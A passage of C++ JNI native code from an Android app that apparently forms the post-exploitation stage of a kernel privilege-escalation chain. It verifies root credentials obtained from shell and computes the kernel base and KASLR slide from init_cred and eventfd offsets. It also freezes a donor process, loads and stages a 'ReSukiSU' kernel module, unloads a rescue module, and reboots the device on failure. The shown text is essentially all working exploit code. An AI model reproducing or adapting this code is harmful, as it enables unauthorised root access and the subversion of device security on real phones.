            "/sys/module/lp3_ctlbuf_rescue/parameters/finalise_status", 4095);
    std::string status_record =
            "BRIDGE_COMMAND_CTLBUF_FINALISE_STATE nonce=" +
            std::string(g_command_watchdog_nonce) + " state=[" +
            status + "]\n";
    if (g_command_watchdog_output_fd >= 0 &&
        status_record.size() < 4608 &&
        write_all(g_command_watchdog_output_fd, status_record.data(),
                  status_record.size())) {
        (void)fsync(g_command_watchdog_output_fd);
    }
    bool status_valid = validate_ctlbuf_finalise_status(status, getpid());
    {
        std::lock_guard<std::mutex> lock(g_ctlbuf_finalise_mutex);
        g_ctlbuf_finalise_proof = status;
        g_ctlbuf_finalise_verified = status_valid;
        g_ctlbuf_finalise_status_code = status_valid ? 0 : EPROTO;
    }
    write_ctlbuf_rescue_stage(
            9, "module-finalise-status", status_valid ? 0 : -1, 0,
            static_cast<int>(status.size()));
    if (!status_valid) {
        return false;
    }
    errno = 0;
    int unload_result = static_cast<int>(syscall(
            SYS_delete_module, "lp3_ctlbuf_rescue", 0));
    int unload_errno = unload_result == 0 ? 0 : errno;
    write_ctlbuf_rescue_stage(
            10, "module-unload", unload_result, unload_errno, 0);
    if (unload_result != 0 || unload_errno != 0) {
        return false;
    }
    std::atomic_thread_fence(std::memory_order_acquire);
    CtlbufDonorResumeRecord resume_record_value =
            g_ctlbuf_donor_resume_record;
    CtlbufDonorResumeProof resume_proof;
    bool resume_valid = validate_ctlbuf_donor_resume_status(
            resume_record_value, getpid(), &resume_proof);
    std::string resume_status = resume_valid
            ? format_ctlbuf_donor_resume_status(resume_record_value)
            : std::string();
    std::string resume_record =
            "BRIDGE_COMMAND_CTLBUF_DONOR_RESUME_STATE nonce=" +
            std::string(g_command_watchdog_nonce) + " state=[" +
            resume_status + "]\n";
    bool resume_recorded = g_command_watchdog_output_fd >= 0 &&
            resume_record.size() < 1024 &&
            write_all(g_command_watchdog_output_fd, resume_record.data(),
                      resume_record.size()) &&
            fsync(g_command_watchdog_output_fd) == 0;
    write_ctlbuf_rescue_stage(
            11, "module-donor-resume-status",
            resume_valid && resume_recorded ? 0 : -1, 0,
            static_cast<int>(resume_status.size()));
    if (!resume_valid || !resume_recorded) {
        return false;
    }
    g_ctlbuf_donor_resume_proof = resume_proof;
    CommandRootIdentity shell_identity;
    bool shell = read_command_root_identity(&shell_identity) &&
            shell_identity.pid == getpid() && shell_identity.tid == getpid() &&
            command_identity_is_shell(shell_identity) &&
            read_bounded_text(
                    "/proc/self/attr/current", 64) == "u:r:shell:s0";
    g_ctlbuf_rescue_module_unloaded = shell;
    write_ctlbuf_rescue_stage(12, "module-exit-shell", shell ? 0 : -1,
            0, shell ? 1 : 0);
    return shell;
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_vandam_prism_NativeBridge_awaitCredentialNormalisation(
        JNIEnv* environment, jclass, jstring nonce_string) {
    if (nonce_string == nullptr || syscall(SYS_gettid) != getpid() ||
        g_command_watchdog_phase.load(std::memory_order_acquire) !=
                kCommandWatchdogPrepared) {
        return environment->NewStringUTF(
                "status=fail stage=credential-normalisation reason=arm");
    }
    const char* nonce_chars = environment->GetStringUTFChars(
            nonce_string, nullptr);
    if (nonce_chars == nullptr) {
        return environment->NewStringUTF(
                "status=fail stage=credential-normalisation reason=nonce");
    }
    bool nonce_valid = std::strcmp(
            nonce_chars, g_command_watchdog_nonce) == 0;
    environment->ReleaseStringUTFChars(nonce_string, nonce_chars);
    CommandRootIdentity shell_identity;
    bool shell_before_wait = read_command_root_identity(&shell_identity) &&
            shell_identity.tid == shell_identity.pid &&
            command_identity_is_shell(shell_identity);
    char waiting[128];
    int waiting_length = std::snprintf(
            waiting, sizeof(waiting), "nonce=%s pid=%d tid=%d",
            g_command_watchdog_nonce, shell_identity.pid,
            shell_identity.tid);
    bool waiting_written = nonce_valid && shell_before_wait &&
            waiting_length > 0 &&
            waiting_length < static_cast<int>(sizeof(waiting)) &&
            g_helper_waiting_fd >= 0 &&
            ftruncate(g_helper_waiting_fd, 0) == 0 &&
            pwrite(g_helper_waiting_fd, waiting,
                   static_cast<std::size_t>(waiting_length), 0) ==
                    static_cast<ssize_t>(waiting_length) &&
            fsync(g_helper_waiting_fd) == 0;
    if (g_helper_waiting_fd >= 0) {
        close(g_helper_waiting_fd);
        g_helper_waiting_fd = -1;
    }
    if (!waiting_written) {
        return environment->NewStringUTF(
                "status=fail stage=credential-normalisation reason=waiting");
    }

    g_command_watchdog_phase.store(
            kCommandWatchdogWaitingForArm, std::memory_order_release);
    char buffered[96];
    int buffered_length = std::snprintf(
            buffered, sizeof(buffered),
            "BRIDGE_COMMAND_BUFFERED nonce=%s\n",
            g_command_watchdog_nonce);
    if (buffered_length <= 0 ||
        buffered_length >= static_cast<int>(sizeof(buffered)) ||
        g_command_watchdog_output_fd < 0 ||
        !write_all(g_command_watchdog_output_fd, buffered,
                   static_cast<std::size_t>(buffered_length))) {
        g_command_watchdog_phase.store(
                kCommandWatchdogFailed, std::memory_order_release);
        return environment->NewStringUTF(
                "status=fail stage=credential-normalisation reason=buffered");
    }
    if (!wait_for_command_watchdog(
                &g_command_watchdog_arm, 1,
                kCommandWatchdogArmTimeoutSeconds) ||
        g_command_watchdog_arm.load(std::memory_order_acquire) != 1) {
        g_command_watchdog_phase.store(
                kCommandWatchdogFailed, std::memory_order_release);
        write_command_watchdog_invalid("arm-wait");
        command_watchdog_reboot_forever();
    }
    g_ctlbuf_donor_leader_stage.store(10, std::memory_order_release);
    CommandRootIdentity root_identity;
    bool root = read_command_root_identity(&root_identity) &&
            root_identity.tid == root_identity.pid &&
            command_identity_is_root(root_identity);
    if (!root) {
        g_command_watchdog_phase.store(
                kCommandWatchdogFailed, std::memory_order_release);
        write_command_watchdog_invalid("leader-identity");
        command_watchdog_reboot_forever();
    }
    g_ctlbuf_donor_leader_stage.store(20, std::memory_order_release);
    g_command_watchdog_leader_identity = root_identity;
    g_command_watchdog_phase.store(
            kCommandWatchdogCreating, std::memory_order_release);
    int create_result = pthread_create(
            &g_command_watchdog_thread, nullptr,
            command_root_watchdog_thread, nullptr);
    if (create_result != 0) {
        g_command_watchdog_phase.store(
                kCommandWatchdogFailed, std::memory_order_release);
        write_command_watchdog_invalid("pthread-create");
        command_watchdog_reboot_forever();
    }
    g_command_watchdog_thread_created = true;
    g_ctlbuf_donor_leader_stage.store(30, std::memory_order_release);
    if (!wait_for_command_watchdog(
                &g_command_watchdog_ready, 1, 5) ||
        g_command_watchdog_ready.load(std::memory_order_acquire) != 1 ||
        g_command_watchdog_phase.load(std::memory_order_acquire) !=
                kCommandWatchdogReady) {
        g_command_watchdog_phase.store(
                kCommandWatchdogFailed, std::memory_order_release);
        write_command_watchdog_invalid("child-ready");
        command_watchdog_reboot_forever();
    }
    g_ctlbuf_donor_leader_stage.store(40, std::memory_order_release);
    g_ctlbuf_donor_leader_stage.store(41, std::memory_order_release);
    if (!wait_for_command_watchdog(
                &g_ctlbuf_donor_freeze_request, 1, 60)) {
        int request = g_ctlbuf_donor_freeze_request.load(
                std::memory_order_acquire);
        g_ctlbuf_donor_kill_rc.store(-1, std::memory_order_release);
        g_ctlbuf_donor_kill_errno.store(
                request < 0 ? EPROTO : ETIMEDOUT,
                std::memory_order_release);
        g_ctlbuf_donor_signal_state.store(-1, std::memory_order_release);
        g_ctlbuf_donor_leader_stage.store(-1, std::memory_order_release);
        command_watchdog_reboot_forever();
    }
    g_ctlbuf_donor_leader_stage.store(50, std::memory_order_release);
    int donor_pid = g_ctlbuf_donor_pid.load(std::memory_order_acquire);
    g_ctlbuf_donor_signal_pid.store(donor_pid, std::memory_order_release);
    errno = 0;
    int donor_signal_result = donor_pid > 0 && donor_pid != getpid()
            ? kill(donor_pid, SIGSTOP) : -1;
    int donor_signal_errno = donor_signal_result == 0 ? 0 : errno;
    g_ctlbuf_donor_kill_rc.store(
            donor_signal_result == 0 ? 0 : -1, std::memory_order_release);
    g_ctlbuf_donor_kill_errno.store(
            donor_signal_result == 0
                    ? 0 : (donor_signal_errno != 0
                            ? donor_signal_errno : EIO),
            std::memory_order_release);
    if (donor_signal_result != 0) {
        g_ctlbuf_donor_signal_state.store(-1, std::memory_order_release);
        g_ctlbuf_donor_leader_stage.store(-1, std::memory_order_release);
        command_watchdog_reboot_forever();
    }

    int expected_signal_state = 0;
    if (!g_ctlbuf_donor_signal_state.compare_exchange_strong(
            expected_signal_state, 1, std::memory_order_acq_rel)) {
        g_ctlbuf_donor_signal_state.store(-1, std::memory_order_release);
        g_ctlbuf_donor_leader_stage.store(-1, std::memory_order_release);
        command_watchdog_reboot_forever();
    }
    g_ctlbuf_donor_leader_stage.store(60, std::memory_order_release);
    if (!wait_for_command_watchdog(
                &g_ctlbuf_donor_frozen_confirmation, 1, 60) ||
        g_ctlbuf_donor_frozen_confirmation.load(
                std::memory_order_acquire) != 1 ||
        g_ctlbuf_donor_signal_state.load(std::memory_order_acquire) != 2) {
        g_ctlbuf_donor_signal_state.store(-1, std::memory_order_release);
        g_ctlbuf_donor_leader_stage.store(-1, std::memory_order_release);
        command_watchdog_reboot_forever();
    }
    g_ctlbuf_donor_leader_stage.store(70, std::memory_order_release);
    g_ctlbuf_donor_frozen.store(1, std::memory_order_release);

    if (!wait_for_command_watchdog(
                &g_command_watchdog_normalise, 1, 60) ||
        g_command_watchdog_normalise.load(std::memory_order_acquire) != 1) {
        command_watchdog_reboot_forever();
    }
    g_command_watchdog_phase.store(
            kCommandWatchdogNormalising, std::memory_order_release);
    bool ctlbuf_repaired = execute_ctlbuf_rescue();
    if (!ctlbuf_repaired) {
        command_watchdog_reboot_forever();
    }
    int watchdog_tid = g_command_watchdog_tid.load(
            std::memory_order_acquire);
    g_command_watchdog_exit.store(1, std::memory_order_release);
    wake_command_watchdog(&g_command_watchdog_exit, 1);
    int join_result = g_command_watchdog_thread_created
            ? pthread_join(g_command_watchdog_thread, nullptr) : ESRCH;
    if (join_result == 0) {
        g_command_watchdog_thread_created = false;
    }
    errno = 0;
    int tid_probe = watchdog_tid > 0
            ? static_cast<int>(syscall(
                    SYS_tgkill, getpid(), watchdog_tid, 0)) : 0;
    int tid_probe_errno = tid_probe == 0 ? 0 : errno;
    bool tid_gone = watchdog_tid > 0 && tid_probe != 0 &&
            tid_probe_errno == ESRCH;
    if (join_result != 0 || !tid_gone) {
        command_watchdog_reboot_forever();
    }
    if (join_result == 0 && tid_gone) {
        write_ctlbuf_rescue_stage(7, "finalise-gate", 0, 0, 1);
    }
    bool finalised = finalise_ctlbuf_rescue();
    if (!finalised) {
        command_watchdog_reboot_forever();
    }
    g_terminal_ctlbuf_repair_verified = true;
    int gid_result = static_cast<int>(syscall(
            SYS_setresgid, 2000, 2000, 2000));
    int uid_result = static_cast<int>(syscall(
            SYS_setresuid, 2000, 2000, 2000));
    g_helper_normalise_uid_result = uid_result;
    g_helper_normalise_gid_result = gid_result;
    bool shell = uid_result == 0 && gid_result == 0 &&
            getuid() == 2000 && geteuid() == 2000 &&
            getgid() == 2000 && getegid() == 2000;
    CommandRootIdentity final_identity;
    shell = shell && read_command_root_identity(&final_identity) &&
            final_identity.tid == final_identity.pid &&
            command_identity_is_shell(final_identity);
    if (!shell) {
        command_watchdog_reboot_forever();
    }
    int resumed_donor_pid = g_ctlbuf_donor_resume_proof.donor_pid;
    int resume_result = g_ctlbuf_donor_resume_proof.signal_result;
    int resume_errno = g_ctlbuf_donor_resume_proof.signal_errno;
    g_ctlbuf_donor_resumed.store(
            g_ctlbuf_donor_resume_proof.valid &&
                    resumed_donor_pid == g_ctlbuf_donor_pid.load(
                            std::memory_order_acquire) &&
                    resume_result == 0 && resume_errno == 0 ? 1 : -1,
            std::memory_order_release);
    bool donor_frozen_recorded =
            g_ctlbuf_donor_frozen.load(std::memory_order_acquire) == 1;
    bool donor_resumed =
            g_ctlbuf_donor_resumed.load(std::memory_order_acquire) == 1;
    bool pass = ctlbuf_repaired && finalised &&
            g_ctlbuf_finalise_verified && g_ctlbuf_rescue_module_loaded &&
            g_ctlbuf_rescue_module_unloaded && shell &&
            join_result == 0 && tid_gone && donor_frozen_recorded &&
            donor_resumed;
    g_command_watchdog_phase.store(
            pass ? kCommandWatchdogNormalised : kCommandWatchdogFailed,
            std::memory_order_release);
    if (g_command_watchdog_output_fd >= 0) {
        close(g_command_watchdog_output_fd);
        g_command_watchdog_output_fd = -1;
    }
    char state[2048];
    int state_length = std::snprintf(state, sizeof(state),
            "status=%s stage=credential-normalisation"
            " watchdog_tid=%d joined=%d tid_gone=%d"
            " uid_result=%d gid_result=%d shell=%d"
            " ctlbuf_repaired=%d module_loaded=%d module_unloaded=%d"
            " module_finalised=%d finalise_proof=%d"
            " donor_frozen=%d donor_resumed=%d donor_resume_pid=%d"
            " donor_resume_result=%d donor_resume_errno=%d"
            " resume_magic=0x%" PRIx64 " resume_version=%u"
            " resume_size=%u resume_cookie_hi=0x%" PRIx64
            " resume_cookie_lo=0x%" PRIx64
            " resume_helper_task=0x%" PRIx64
            " resume_helper_pid=%d"
            " resume_donor_task=0x%" PRIx64 " resume_donor_tgid=%d"
            " resume_signal=%d resume_before_state=0x%" PRIx64
            " resume_before_exit_state=0x%" PRIx64
            " resume_before_threads=%u resume_before_stopped=%u"
            " resume_after_state=0x%" PRIx64
            " resume_after_exit_state=0x%" PRIx64
            " resume_after_threads=%u resume_after_stopped=%u"
            " resume_stable_samples=%u resume_task_security=0x%" PRIx64
            " resume_task_security_word8=0x%" PRIx64
            " resume_inode_security=0x%" PRIx64
            " resume_inode_security_word8=0x%" PRIx64
            " resume_labels_restored=%u resume_resumed=%u"
            " resume_proof=%u resume_commit=0x%" PRIx64,
            pass ? "pass" : "fail", watchdog_tid,
            join_result == 0 ? 1 : 0, tid_gone ? 1 : 0,
            uid_result, gid_result, shell ? 1 : 0,
            ctlbuf_repaired ? 1 : 0,
            g_ctlbuf_rescue_module_loaded ? 1 : 0,
            g_ctlbuf_rescue_module_unloaded ? 1 : 0,
            finalised ? 1 : 0, g_ctlbuf_finalise_verified ? 1 : 0,
            donor_frozen_recorded ? 1 : 0, donor_resumed ? 1 : 0,
            resumed_donor_pid, resume_result, resume_errno,
            g_ctlbuf_donor_resume_record.magic,
            g_ctlbuf_donor_resume_record.version,
            g_ctlbuf_donor_resume_record.size,
            g_ctlbuf_donor_resume_proof.cookie_hi,
            g_ctlbuf_donor_resume_proof.cookie_lo,
            g_ctlbuf_donor_resume_proof.helper_task,
            g_ctlbuf_donor_resume_record.helper_pid,
            g_ctlbuf_donor_resume_proof.donor_task,
            g_ctlbuf_donor_resume_proof.donor_tgid,
            g_ctlbuf_donor_resume_record.signal,
            g_ctlbuf_donor_resume_proof.before_state,
            g_ctlbuf_donor_resume_proof.before_exit_state,
            g_ctlbuf_donor_resume_proof.before_threads,
            g_ctlbuf_donor_resume_proof.before_stopped,
            g_ctlbuf_donor_resume_proof.after_state,
            g_ctlbuf_donor_resume_proof.after_exit_state,
            g_ctlbuf_donor_resume_proof.after_threads,
            g_ctlbuf_donor_resume_proof.after_stopped,
            g_ctlbuf_donor_resume_proof.stable_samples,
            g_ctlbuf_donor_resume_proof.task_security,
            g_ctlbuf_donor_resume_proof.task_security_word8,
            g_ctlbuf_donor_resume_proof.inode_security,
            g_ctlbuf_donor_resume_proof.inode_security_word8,
            g_ctlbuf_donor_resume_record.labels_restored,
            g_ctlbuf_donor_resume_record.resumed,
            g_ctlbuf_donor_resume_record.proof,
            g_ctlbuf_donor_resume_record.commit);
    if (state_length <= 0 ||
        state_length >= static_cast<int>(sizeof(state))) {
        g_command_watchdog_phase.store(
                kCommandWatchdogFailed, std::memory_order_release);
        return environment->NewStringUTF(
                "status=fail stage=credential-normalisation reason=record");
    }
    return environment->NewStringUTF(state);
}

extern "C" JNIEXPORT void JNICALL
Java_com_vandam_prism_NativeBridge_signalCommandRootWatchdogArm(
        JNIEnv*, jclass) {
    int phase = g_command_watchdog_phase.load(std::memory_order_acquire);
    if (phase != kCommandWatchdogWaitingForArm) {
        g_command_watchdog_phase.store(
                kCommandWatchdogFailed, std::memory_order_release);
        write_command_watchdog_invalid("arm-phase");
        return;
    }
    g_command_watchdog_arm.store(1, std::memory_order_release);
    wake_command_watchdog(&g_command_watchdog_arm, 1);
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_vandam_prism_NativeBridge_commandRootWatchdogIdentity(
        JNIEnv* environment, jclass) {
    int phase = g_command_watchdog_phase.load(std::memory_order_acquire);
    int ready = g_command_watchdog_ready.load(std::memory_order_acquire);
    CommandRootIdentity identity;
    if (phase == kCommandWatchdogReady && ready == 1) {
        identity = g_command_watchdog_identity;
    }
    bool pass = phase == kCommandWatchdogReady && ready == 1 &&
            identity.tid == g_command_watchdog_tid.load(
                    std::memory_order_acquire) &&
            identity.tid != identity.pid &&
            same_command_root_identity(
                    g_command_watchdog_leader_identity, identity);
    char state[320];
    std::snprintf(state, sizeof(state),
            "status=%s stage=command-root-watchdog pid=%d tid=%d"
            " uid=%u,%u,%u gid=%u,%u,%u fsuid=%u fsgid=%u"
            " cap_eff=%016" PRIx64,
            pass ? "pass" : "fail", identity.pid, identity.tid,
            identity.uid[0], identity.uid[1], identity.uid[2],
            identity.gid[0], identity.gid[1], identity.gid[2],
            identity.fsuid, identity.fsgid, identity.effective_caps);
    return environment->NewStringUTF(state);
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_vandam_prism_NativeBridge_runReSukiAction(
        JNIEnv* environment, jclass, jobject descriptor,
        jobject module_descriptor, jint manager_uid, jboolean activate) {
    int source_fd = file_descriptor_value(environment, descriptor);
    int duplicate = source_fd >= 0 ? fcntl(source_fd, F_DUPFD, 100) : -1;
    int module_source_fd = file_descriptor_value(
            environment, module_descriptor);
    int module_duplicate = module_source_fd >= 0
            ? fcntl(module_source_fd, F_DUPFD, 100) : -1;
    int action = activate == JNI_TRUE ? 2 : 1;
    int expected = 0;
    bool prepared = duplicate >= 0 && module_duplicate >= 0 &&
            manager_uid >= 10'000 &&
            manager_uid < 20'000 &&
            g_resukisu_probe != nullptr && g_resukisu_load != nullptr &&
            g_command_watchdog_phase.load(std::memory_order_acquire) ==
                    kCommandWatchdogReady &&
            (action != 2 || g_resukisu_kernel_base.load(
                    std::memory_order_acquire) != 0) &&
            g_resukisu_action.load(std::memory_order_acquire) == 0;
    if (prepared) {
        g_resukisu_fd = duplicate;
        g_resukisu_module_fd = module_duplicate;
        g_resukisu_manager_uid.store(manager_uid,
                std::memory_order_relaxed);
        prepared = g_resukisu_action.compare_exchange_strong(
                expected, action, std::memory_order_release,
                std::memory_order_acquire);
        if (!prepared) {
            g_resukisu_fd = -1;
            g_resukisu_module_fd = -1;
            g_resukisu_manager_uid.store(-1,
                    std::memory_order_relaxed);
        }
    }
    if (!prepared) {
        if (duplicate >= 0) {
            close(duplicate);
        }
        if (module_duplicate >= 0) {
            close(module_duplicate);
        }
        return environment->NewStringUTF(
                "status=fail stage=resukisu-action reason=prepare exit=-1 errno=0");
    }
    wake_command_watchdog(&g_resukisu_action, INT_MAX);
    bool completed = wait_for_command_watchdog(
            &g_resukisu_action, 3, 125);
    int result = g_resukisu_exit.load(std::memory_order_acquire);
    int error = g_resukisu_errno.load(std::memory_order_acquire);
    bool pass = completed && result == 0 && error == 0;
    char state[192];
    std::snprintf(state, sizeof(state),
            "status=%s stage=resukisu-action action=%s exit=%d errno=%d",
            pass ? "pass" : "fail", activate == JNI_TRUE ? "activate" : "probe",
            result, error);
    return environment->NewStringUTF(state);
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_vandam_prism_NativeBridge_prepareReSukiLoader(
        JNIEnv* environment, jclass, jobject descriptor) {
    int source_fd = file_descriptor_value(environment, descriptor);
    int duplicate = source_fd >= 0
            ? fcntl(source_fd, F_DUPFD_CLOEXEC, 100) : -1;
    void* library = nullptr;
    ReSukiProbeFunction probe = nullptr;
    ReSukiRelocateProbeFunction relocate_probe = nullptr;
    ReSukiStageFunction stage = nullptr;
    ReSukiLoadFunction load = nullptr;
    if (duplicate >= 0 && g_resukisu_library == nullptr) {
        char path[64];
        std::snprintf(path, sizeof(path), "/proc/self/fd/%d", duplicate);
        library = dlopen(path, RTLD_NOW | RTLD_LOCAL);
        if (library != nullptr) {
            probe = reinterpret_cast<ReSukiProbeFunction>(
                    dlsym(library, "lp3_resukisu_probe"));
            relocate_probe = reinterpret_cast<ReSukiRelocateProbeFunction>(
                    dlsym(library, "lp3_resukisu_relocate_probe"));
            stage = reinterpret_cast<ReSukiStageFunction>(
                    dlsym(library, "lp3_resukisu_stage"));
            load = reinterpret_cast<ReSukiLoadFunction>(
                    dlsym(library, "lp3_resukisu_load"));
        }
    }
    if (duplicate >= 0) {
        close(duplicate);
    }
    int relocation = relocate_probe == nullptr
            ? -1 : relocate_probe(kKernelLinkBase);
    bool pass = library != nullptr && probe != nullptr &&
            relocate_probe != nullptr && stage != nullptr && load != nullptr &&
            probe() == UINT32_C(0x4c503352) && relocation == 0;
    if (pass) {
        g_resukisu_library = library;
        g_resukisu_probe = probe;
        g_resukisu_relocate_probe = relocate_probe;
        g_resukisu_stage = stage;
        g_resukisu_load = load;
    } else if (library != nullptr) {
        dlclose(library);
    }
    char state[192];
    std::snprintf(state, sizeof(state),
            "status=%s stage=resukisu-loader-prepare"
            " loaded=%d symbols=%d relocation=%d",
            pass ? "pass" : "fail", library != nullptr ? 1 : 0,
            probe != nullptr && relocate_probe != nullptr &&
                    stage != nullptr && load != nullptr
                    ? 1 : 0,
            relocation);
    return environment->NewStringUTF(state);
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_vandam_prism_NativeBridge_stageReSukiModule(
        JNIEnv* environment, jclass, jobject descriptor, jlong kernel_base) {
    std::uint64_t runtime_base = static_cast<std::uint64_t>(kernel_base);
    std::uint64_t slide = runtime_base - kKernelLinkBase;
    bool base_valid = kernel_address(runtime_base) &&
            runtime_base >= kKernelLinkBase &&
            (runtime_base & (kKaslrAlignment - 1)) == 0 &&
            (slide & (kKaslrAlignment - 1)) == 0;
    int source_fd = file_descriptor_value(environment, descriptor);
    int duplicate = source_fd >= 0
            ? fcntl(source_fd, F_DUPFD_CLOEXEC, 100) : -1;
    int relocation = base_valid && g_resukisu_relocate_probe != nullptr
            ? g_resukisu_relocate_probe(runtime_base) : -1;
    int result = duplicate >= 0 && base_valid && relocation == 0 &&
            g_resukisu_stage != nullptr &&
            g_command_watchdog_phase.load(std::memory_order_acquire) ==
                    kCommandWatchdogReady &&
            g_resukisu_kernel_base.load(std::memory_order_acquire) == 0
            ? g_resukisu_stage(duplicate, runtime_base)
            : -1;
    if (result == 0) {
        g_resukisu_kernel_base.store(
                runtime_base, std::memory_order_release);
    }
    if (duplicate >= 0) {
        close(duplicate);
    }
    char state[192];
    std::snprintf(state, sizeof(state),
            "status=%s stage=resukisu-stage result=%d relocation=%d"
            " kernel_base=0x%" PRIx64 " kaslr_slide=0x%" PRIx64,
            result == 0 ? "pass" : "fail", result, relocation,
            runtime_base, slide);
    return environment->NewStringUTF(state);
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_vandam_prism_NativeBridge_reSukiStagePlan(
        JNIEnv* environment, jclass, jstring nonce_string) {
    if (nonce_string == nullptr) {
        return environment->NewStringUTF(
                "status=fail stage=resukisu-stage-plan reason=nonce");
    }
    const char* nonce = environment->GetStringUTFChars(
            nonce_string, nullptr);
    if (nonce == nullptr) {
        return environment->NewStringUTF(
                "status=fail stage=resukisu-stage-plan reason=nonce");
    }
    std::size_t nonce_length = std::strlen(nonce);
    bool nonce_valid = nonce_length == 32 && std::all_of(
            nonce, nonce + nonce_length, [](unsigned char value) {
                return (value >= '0' && value <= '9') ||
                        (value >= 'a' && value <= 'f');
            });
    std::uint64_t kernel_base = kKernelLinkBase + g_profile_kernel_slide;
    bool image_profile = nonce_valid && kernel_address(kernel_base) &&
            kernel_base >= kKernelLinkBase &&
            (kernel_base & (kKaslrAlignment - 1)) == 0 &&
            g_last_binder_probe_base == kernel_base &&
            g_last_binder_probe_fops == kernel_base + kEventfdFopsOffset &&
            g_profile_init_cred == kernel_base + kInitCredOffset &&
            g_profile_init_cred == g_last_binder_probe_init_cred;
    char state[224];
    std::snprintf(state, sizeof(state),
            "status=%s stage=resukisu-stage-plan nonce=%s"
            " kernel_base=0x%" PRIx64 " kaslr_slide=0x%" PRIx64,
            image_profile ? "pass" : "fail", nonce,
            kernel_base, g_profile_kernel_slide);
    environment->ReleaseStringUTFChars(nonce_string, nonce);
    return environment->NewStringUTF(state);
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_vandam_prism_NativeBridge_signalCtlbufDonorFreeze(
        JNIEnv* environment, jclass, jint donor_pid) {
    int expected = 0;
    if (donor_pid <= 0 ||
        !g_ctlbuf_donor_freeze_request.compare_exchange_strong(
                expected, 2, std::memory_order_acq_rel)) {
        g_ctlbuf_donor_freeze_request.store(-1,
                std::memory_order_release);
        g_ctlbuf_donor_signal_state.store(-1, std::memory_order_release);
        g_ctlbuf_donor_leader_stage.store(-1, std::memory_order_release);
    } else {
        g_ctlbuf_donor_pid.store(donor_pid, std::memory_order_release);
        expected = 2;
        if (!g_ctlbuf_donor_freeze_request.compare_exchange_strong(
                expected, 1, std::memory_order_release,
                std::memory_order_acquire)) {
            g_ctlbuf_donor_freeze_request.store(-1,
                    std::memory_order_release);
            g_ctlbuf_donor_signal_state.store(-1,
                    std::memory_order_release);
            g_ctlbuf_donor_leader_stage.store(-1,
                    std::memory_order_release);
        }
    }
    bool leader_processed = g_ctlbuf_donor_freeze_request.load(
            std::memory_order_acquire) == 1 &&
            wait_for_command_watchdog(
                    &g_ctlbuf_donor_leader_stage, 60, 15);
    if (!leader_processed) {
        g_ctlbuf_donor_freeze_request.store(-1,
                std::memory_order_release);
        g_ctlbuf_donor_signal_state.store(-1, std::memory_order_release);
        g_ctlbuf_donor_frozen_confirmation.store(
                -1, std::memory_order_release);
        wake_command_watchdog(&g_ctlbuf_donor_frozen_confirmation, INT_MAX);
    }
    int observed_pid = g_ctlbuf_donor_signal_pid.load(
            std::memory_order_acquire);
    int kill_rc = g_ctlbuf_donor_kill_rc.load(std::memory_order_acquire);
    int kill_errno = g_ctlbuf_donor_kill_errno.load(
            std::memory_order_acquire);
    int signal_state = g_ctlbuf_donor_signal_state.load(
            std::memory_order_acquire);
    int leader_stage = g_ctlbuf_donor_leader_stage.load(
            std::memory_order_acquire);
    int request = g_ctlbuf_donor_freeze_request.load(
            std::memory_order_acquire);
    bool pass = leader_processed && request == 1 &&
            observed_pid == donor_pid && kill_rc == 0 && kill_errno == 0 &&
            signal_state == 1 && leader_stage == 60;
    if (!pass) {
        g_ctlbuf_donor_signal_state.store(-1, std::memory_order_release);
        g_ctlbuf_donor_frozen_confirmation.store(
                -1, std::memory_order_release);
        wake_command_watchdog(&g_ctlbuf_donor_frozen_confirmation, INT_MAX);
    }
    char state[384];
    std::snprintf(state, sizeof(state),
            "status=%s stage=ctlbuf-donor-signal nonce=%s pid=%d"
            " kill_rc=%d kill_errno=%d signal_state=%d leader_stage=%d",
            pass ? "pass" : "fail", g_command_watchdog_nonce, donor_pid,
            kill_rc, kill_errno, signal_state, leader_stage);
    return environment->NewStringUTF(state);
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_vandam_prism_NativeBridge_signalCtlbufDonorFrozen(
        JNIEnv* environment, jclass, jint donor_pid) {
    int expected_pid = g_ctlbuf_donor_pid.load(std::memory_order_acquire);
    int signal_state = g_ctlbuf_donor_signal_state.load(
            std::memory_order_acquire);
    int expected_confirmation = 0;
    bool confirmation_accepted = false;
    if (donor_pid <= 0 || donor_pid != expected_pid || signal_state != 1 ||
        !g_ctlbuf_donor_frozen_confirmation.compare_exchange_strong(
                expected_confirmation, 2, std::memory_order_acq_rel)) {
        g_ctlbuf_donor_signal_state.store(-1, std::memory_order_release);
        g_ctlbuf_donor_frozen_confirmation.store(
                -1, std::memory_order_release);
        wake_command_watchdog(&g_ctlbuf_donor_frozen_confirmation, INT_MAX);
    } else {
        int expected_signal_state = 1;
        if (!g_ctlbuf_donor_signal_state.compare_exchange_strong(
                expected_signal_state, 2, std::memory_order_acq_rel)) {
            g_ctlbuf_donor_signal_state.store(-1,
                    std::memory_order_release);
            g_ctlbuf_donor_frozen_confirmation.store(
                    -1, std::memory_order_release);
            wake_command_watchdog(
                    &g_ctlbuf_donor_frozen_confirmation, INT_MAX);
        } else {
            g_ctlbuf_donor_frozen_confirmation.store(
                    1, std::memory_order_release);
            wake_command_watchdog(
                    &g_ctlbuf_donor_frozen_confirmation, 1);
            confirmation_accepted = true;
        }
    }
    bool frozen_ready = confirmation_accepted &&
            wait_for_command_watchdog(&g_ctlbuf_donor_frozen, 1, 15);
    int observed_frozen_pid = g_ctlbuf_donor_signal_pid.load(
            std::memory_order_acquire);
    int confirmation = g_ctlbuf_donor_frozen_confirmation.load(
            std::memory_order_acquire);
    int frozen_signal_state = g_ctlbuf_donor_signal_state.load(
            std::memory_order_acquire);
    int frozen = g_ctlbuf_donor_frozen.load(std::memory_order_acquire);
    int leader_stage = g_ctlbuf_donor_leader_stage.load(
            std::memory_order_acquire);
    if (!frozen_ready) {
        g_ctlbuf_donor_signal_state.store(-1, std::memory_order_release);
        g_ctlbuf_donor_frozen_confirmation.store(
                -1, std::memory_order_release);
        wake_command_watchdog(&g_ctlbuf_donor_frozen_confirmation, INT_MAX);
    }
    bool pass = frozen_ready && observed_frozen_pid == donor_pid &&
            confirmation == 1 && frozen_signal_state == 2 && frozen == 1 &&
            leader_stage == 70;
    if (!pass) {
        g_ctlbuf_donor_signal_state.store(-1, std::memory_order_release);
        g_ctlbuf_donor_frozen_confirmation.store(
                -1, std::memory_order_release);
